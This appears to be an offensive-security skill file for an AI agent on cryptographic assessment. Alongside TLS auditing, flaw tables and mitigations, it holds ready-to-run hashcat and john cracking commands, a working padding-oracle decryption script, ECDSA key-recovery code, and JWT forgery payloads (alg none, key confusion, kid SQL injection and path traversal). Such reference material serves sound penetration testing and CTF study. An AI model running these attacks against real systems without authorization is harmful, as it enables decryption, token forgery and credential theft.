---
name: crypto-analysis
description: Cryptographic assessment — cipher identification, TLS auditing, hash analysis, key strength evaluation, side-channel detection, crypto implementation review
metadata:
  type: offensive
  phase: analysis
  tools: openssl, testssl, hashcat, john, hashid, rsactftool
kill_chain:
  phase: [recon, exploit]
  step: [1, 4]
  attck_tactics: [TA0043, TA0006]
depends_on: [recon-osint]
feeds_into: [exploit-development]
inputs: [tls_config, crypto_implementation, hash_samples]
outputs: [crypto_weakness_report, finding_record]
---

# Cryptographic Analysis

## When to Activate

- Assessing cryptographic implementations in code
- TLS/SSL configuration auditing
- Hash cracking and identification
- Key management review
- Side-channel vulnerability assessment
- CTF crypto challenges

## Cipher & Hash Identification

```bash
# Hash identification
hashid '$2b$12$LJ3m4sMKfRzG...'  # bcrypt
hashid '5f4dcc3b5aa765d61d8327deb882cf99'  # MD5
# hashcat mode reference:
# 0=MD5, 100=SHA1, 1400=SHA256, 1800=SHA512crypt
# 3200=bcrypt, 1000=NTLM, 5600=NetNTLMv2
# 13100=Kerberoast, 18200=AS-REP, 22000=WPA-PBKDF2

# Cipher identification
# Look for: block size, key size, mode of operation
# ECB: identical plaintext blocks → identical ciphertext blocks
# CBC: IV required, padding oracle possible
# GCM: authenticated, nonce-misuse catastrophic
# CTR: stream cipher mode, nonce reuse = XOR of plaintexts
```

## TLS/SSL Auditing

```bash
# testssl.sh (comprehensive)
testssl.sh --full https://target.com
testssl.sh --vulnerable https://target.com

# OpenSSL manual checks
openssl s_client -connect target.com:443 -tls1_2
openssl s_client -connect target.com:443 -cipher 'NULL:eNULL:aNULL'  # null ciphers
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -text -noout  # cert details

# Check specific vulnerabilities
# Heartbleed: openssl s_client -connect target:443 -tlsextdebug
# POODLE: test SSLv3 support
# ROBOT: test RSA key exchange
# CRIME/BREACH: check TLS compression

# Certificate analysis
openssl x509 -in cert.pem -text -noout
# Check: expiry, key size, signature algorithm, SAN, chain validity
```

## Hash Cracking

```bash
# Hashcat
hashcat -m 0 hashes.txt wordlist.txt                    # MD5 dictionary
hashcat -m 0 hashes.txt wordlist.txt -r rules/best64.rule  # with rules
hashcat -m 1000 hashes.txt wordlist.txt                 # NTLM
hashcat -m 5600 hashes.txt wordlist.txt                 # NetNTLMv2
hashcat -m 13100 hashes.txt wordlist.txt                # Kerberoast
hashcat -m 22000 capture.hc22000 wordlist.txt           # WPA

# Mask attacks (brute force with pattern)
hashcat -m 0 hashes.txt -a 3 ?u?l?l?l?l?d?d?d?s        # Ullllddd!
hashcat -m 0 hashes.txt -a 3 'Company?d?d?d?d'          # Company0000-9999

# John the Ripper
john --wordlist=wordlist.txt --format=raw-md5 hashes.txt
john --rules --wordlist=wordlist.txt hashes.txt

# Common password patterns:
# Season+Year: Summer2024!, Winter2025!
# Company+digits: Company123!, Corp2024#
# Keyboard walks: qwerty123, !QAZ2wsx
```

## Crypto Implementation Review

### Common Vulnerabilities

| Issue | Impact | Detection |
|-------|--------|-----------|
| ECB mode | Pattern leakage | Identical ciphertext blocks |
| Static IV/nonce | Plaintext recovery | Hardcoded IV in code |
| Nonce reuse (CTR/GCM) | Full plaintext recovery | Counter reset, random nonce collision |
| No HMAC/authentication | Ciphertext manipulation | Encrypt without MAC |
| Weak KDF | Brute-forceable keys | MD5/SHA1 of password directly |
| Predictable randomness | Key/nonce prediction | Math.random(), time-based seeds |
| Padding oracle | Byte-by-byte decryption | Different errors for bad padding vs bad data |
| RSA without padding | Textbook RSA attacks | Direct RSA encrypt without OAEP |
| Small RSA exponent | Cube root attack | e=3 with small message |
| Shared RSA modulus | Factor via GCD | Multiple keys with common factors |

### Code Patterns to Flag
```python
# DANGEROUS: ECB mode
cipher = AES.new(key, AES.MODE_ECB)

# DANGEROUS: Static IV
iv = b'\x00' * 16
cipher = AES.new(key, AES.MODE_CBC, iv)

# DANGEROUS: Weak KDF
key = hashlib.md5(password.encode()).digest()

# DANGEROUS: No authentication
ct = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(pt))
# Missing: HMAC over ciphertext

# DANGEROUS: Predictable randomness
import random
key = random.randbytes(32)  # NOT cryptographically secure

# SAFE: Proper authenticated encryption
from cryptography.fernet import Fernet  # AES-CBC + HMAC
from cryptography.hazmat.primitives.ciphers.aead import AESGCM  # AES-GCM
```

## RSA Attacks (CTF/Research)

```python
# Small public exponent (e=3, small message)
import gmpy2
m = gmpy2.iroot(c, 3)[0]  # cube root of ciphertext

# Common modulus attack (same n, different e)
# Extended GCD on e1, e2 → recover plaintext

# Wiener's attack (small private exponent)
# Continued fraction expansion of e/n

# Fermat factorization (p ≈ q)
# a = isqrt(n), check if a²-n is perfect square

# Hastad's broadcast attack (same m, e recipients)
# CRT on e ciphertexts → recover m^e → take e-th root

# RSA-CTF-Tool (automated)
python3 RsaCtfTool.py -n $N -e $E --uncipher $C
```

## Side-Channel Analysis

```
# Timing attacks:
- String comparison: early termination leaks prefix length
- Modular exponentiation: square-and-multiply timing differences
- Cache timing: AES T-table access patterns

# Power analysis:
- Simple PA: directly observe key bits from power trace
- Differential PA: statistical correlation across many traces

# Detection in code:
- Non-constant-time comparison (memcmp, strcmp, ==)
- Branching on secret data (if key_bit: ...)
- Variable-time operations on secrets
- Table lookups indexed by secret data

# Mitigations:
- Constant-time comparison (crypto_memcmp, hmac.compare_digest)
- Branchless implementations
- Blinding (RSA, ECDSA)
- Masking (AES)
```

## Advanced: Padding Oracle Attack Implementation

```python
import requests

def padding_oracle_attack(url, ciphertext: bytes, block_size=16):
    """Decrypt ciphertext byte-by-byte using padding oracle"""
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    plaintext = b''
    
    for block_idx in range(len(blocks)-1, 0, -1):
        target_block = blocks[block_idx]
        prev_block = bytearray(blocks[block_idx - 1])
        intermediate = bytearray(block_size)
        decrypted_block = bytearray(block_size)
        
        for byte_pos in range(block_size - 1, -1, -1):
            padding_val = block_size - byte_pos
            
            # Set already-found bytes for correct padding
            test_block = bytearray(block_size)
            for k in range(byte_pos + 1, block_size):
                test_block[k] = intermediate[k] ^ padding_val
            
            # Brute force current byte
            for guess in range(256):
                test_block[byte_pos] = guess
                payload = bytes(test_block) + bytes(target_block)
                
                resp = requests.post(url, data=payload)
                if resp.status_code != 400:  # Valid padding
                    intermediate[byte_pos] = guess ^ padding_val
                    decrypted_block[byte_pos] = intermediate[byte_pos] ^ prev_block[byte_pos]
                    break
        
        plaintext = bytes(decrypted_block) + plaintext
    
    return plaintext

# Attack complexity: 256 * block_size * num_blocks requests
# 16-byte blocks, 3 blocks: ~12,288 requests max
```

## Advanced: Elliptic Curve Attacks

### ECDSA Nonce Reuse
```python
# If same nonce k is used for two different messages → private key recovery
# Given: (r, s1, hash1) and (r, s2, hash2) with same r (same k)

from Crypto.Util.number import inverse

def recover_key_from_nonce_reuse(r, s1, s2, hash1, hash2, n):
    """Recover ECDSA private key from nonce reuse"""
    # k = (hash1 - hash2) * inverse(s1 - s2, n) mod n
    k = ((hash1 - hash2) * inverse(s1 - s2, n)) % n
    # d = (s1 * k - hash1) * inverse(r, n) mod n
    d = ((s1 * k - hash1) * inverse(r, n)) % n
    return d

# Detection: two signatures with identical r value → nonce reused
# Historical: Sony PS3 used fixed k → complete ECDSA key recovery
```

### Biased Nonce Attack (Lattice-Based)
```python
# If ECDSA nonce has ANY bias (even a few bits) → key recovery via LLL
# Example: top 8 bits of nonce always zero (biased PRNG)

from sage.all import *

def lattice_ecdsa_attack(signatures, public_key, n, bias_bits=8):
    """Recover ECDSA private key from biased nonces
    signatures: list of (r, s, hash) tuples
    """
    num_sigs = len(signatures)
    
    # Build lattice:
    # For each sig: s_i * k_i = hash_i + r_i * d (mod n)
    # k_i has top `bias_bits` bits as 0: k_i < n / 2^bias_bits
    
    B = Matrix(QQ, num_sigs + 2, num_sigs + 2)
    
    for i in range(num_sigs):
        r_i, s_i, h_i = signatures[i]
        t_i = (inverse_mod(s_i, n) * r_i) % n
        u_i = (inverse_mod(s_i, n) * h_i) % n  # negated
        B[i, i] = n
        B[num_sigs, i] = t_i
        B[num_sigs + 1, i] = u_i
    
    B[num_sigs, num_sigs] = 1
    B[num_sigs + 1, num_sigs + 1] = n // (2 ** bias_bits)
    
    # LLL reduction
    reduced = B.LLL()
    # Private key is in reduced basis
    return reduced
```

### Invalid Curve Attack
```python
# Force ECDH onto weak curve by sending points not on the curve
# If implementation doesn't validate that received point is on curve:
# Attacker sends point on a different (weak) curve
# Shared secret computed on weak curve → small subgroup → discrete log easy

# Attack flow:
# 1. Find curves with small order subgroups
# 2. Send points from these weak curves as "public keys"
# 3. Victim computes shared secret on weak curve
# 4. Solve discrete log on weak curve (small order → trivial)
# 5. Reconstruct private key via CRT (combine multiple weak curve results)

# Prevention: always validate that received point is on the expected curve
# Check: y^2 = x^3 + ax + b (mod p)
```

## Advanced: AES Implementation Attacks

### Cache Timing Attack on AES T-Tables
```python
# AES uses lookup tables (T-tables) indexed by key-dependent values
# Cache line accessed depends on (plaintext ^ key) byte
# By measuring cache access times → recover key bytes

# Attack setup:
# 1. Attacker and victim share CPU cache (same machine or VM)
# 2. Flush shared cache lines (Flush+Reload) or prime (Prime+Probe)
# 3. Victim encrypts attacker-chosen plaintext
# 4. Measure which T-table entries were accessed
# 5. Correlate with plaintext → deduce key bytes

# Flush+Reload on OpenSSL AES:
import ctypes, time

def flush_reload_probe(table_addr, cache_line_size=64):
    """Measure access time to determine if line is cached"""
    # Flush: clflush(table_addr)
    start = time.perf_counter_ns()
    # Access: read(table_addr)
    elapsed = time.perf_counter_ns() - start
    # Cached: ~4-10 cycles, Uncached: ~200+ cycles
    return elapsed < 50  # threshold in ns

# Protection: constant-time AES (AES-NI hardware instructions)
# AES-NI doesn't use lookup tables → immune to cache timing
```

### Bleichenbacher's Attack (RSA PKCS#1 v1.5)
```python
# Adaptive chosen-ciphertext attack on RSA with PKCS#1 v1.5 padding
# Requires: padding oracle (server tells if decrypted padding is valid)
# Result: full plaintext recovery in ~1 million queries

# ROBOT attack (Return Of Bleichenbacher's Oracle Threat):
# Modern variant — many TLS implementations still vulnerable
# Test: send malformed RSA-encrypted premaster secret
# Different error responses for bad padding vs bad data → oracle

# Step 1: Multiplying ciphertext by s
# c' = (c * s^e) mod n = (m * s)^e mod n
# If server says padding valid → m*s starts with 0x00 0x02

# Step 2: Narrow range of possible m values
# Repeat with different s values
# Each valid padding response halves the search space

# Step 3: After ~O(log n) valid responses → recover exact m

# testssl.sh detects this:
# testssl.sh --robot target.com:443
```

## Advanced: Protocol-Level Crypto Attacks

### TLS Downgrade Attacks
```bash
# POODLE: Force SSLv3 → CBC padding oracle
# Test: testssl.sh --poodle target.com

# DROWN: SSLv2 cross-protocol attack on TLS
# If server shares RSA key between SSLv2 and TLS:
# Decrypt TLS sessions using SSLv2 oracle
# Test: testssl.sh --drown target.com

# Logjam: DHE with 512/768-bit primes
# Precompute discrete log for common primes
# Real-time decryption of DHE sessions
# Test: nmap --script ssl-dh-params target

# SWEET32: Birthday attack on 64-bit block ciphers (3DES, Blowfish)
# After 2^32 blocks (~32GB): block collision → plaintext recovery
# Test: check for 3DES/Blowfish cipher suites

# Raccoon attack (DH timing): measure DH key agreement timing
# Different leading zero bytes → different processing time
# Test: timing-based, requires many connections
```

### Certificate Attacks
```bash
# Self-signed cert acceptance (MITM)
# Many clients skip certificate validation → intercept TLS

# Certificate transparency log monitoring
# Search CT logs for certificates issued for target domain
# Find: shadow IT, staging environments, forgotten subdomains
curl "https://crt.sh/?q=%25.target.com&output=json" | jq '.[].name_value'

# OCSP stapling issues
# If OCSP responder is down and server doesn't staple → soft-fail
# Revoked certs still accepted during OCSP outage

# Key reuse across services
# Same RSA key on multiple servers → DROWN-style cross-protocol attacks
# Find: scan all ports/services for matching public keys
```

## Advanced: Real-World Crypto Failures

### JWT Vulnerabilities
```python
import jwt, json, base64

# Algorithm confusion: RS256 → HS256
# Server expects RS256 (asymmetric) but accepts HS256 (symmetric)
# Sign with the PUBLIC key as HMAC secret → valid signature
public_key = open('public.pem', 'r').read()
forged = jwt.encode({"sub": "admin", "role": "admin"}, 
    public_key, algorithm="HS256")

# None algorithm
header = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = base64.b64encode(json.dumps({"sub": "admin"}).encode())
forged = f"{header.decode()}.{payload.decode()}."  # empty signature

# JWK injection (embed key in header)
# Set "jwk" header to attacker's key → server uses it to verify

# JKU/X5U injection (point to attacker key URL)
# Set "jku" header to attacker URL hosting JWKS
# Server fetches attacker's keys → verifies with attacker's key

# Kid injection (key ID SQL injection or path traversal)
# kid: "../../dev/null" → empty key → predictable HMAC
# kid: "' UNION SELECT 'secret' --" → SQL injection in key lookup
```
